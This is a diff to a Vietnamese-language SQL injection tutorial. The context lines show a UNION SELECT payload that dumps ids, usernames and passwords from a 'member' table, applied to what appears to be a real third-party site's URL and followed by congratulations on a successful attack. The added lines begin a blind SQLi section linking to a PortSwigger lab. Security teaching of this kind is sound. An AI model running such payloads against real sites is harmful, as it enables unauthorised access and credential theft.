@@ -60,8 +60,15 @@ Link đổi sang Hex: https://www.hexator.com/ <br>
   Chèn dấu `/` để dễ nhìn => `2f` => ```union select group_concat(id,0x2f,username,0x2f,password),2 from member-- -```
 - Trông nó sẽ như thế này:```http://www.igoergo.com/_site/products.php?cat=-02%20union%20select%20group_concat(id,0x2f,username,0x2f,password),2%20from%20member--%20-```
 ### Chúc mừng bạn đã tấn công thành công!!!
+<br>
+<br>
+<br>
 
+***
+# Lab 2: Blind SQLi
 
+- Link to lab```https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses```
+- Link tải Burp Suite```https://portswigger.net/burp/communitydownload```
 
 
 
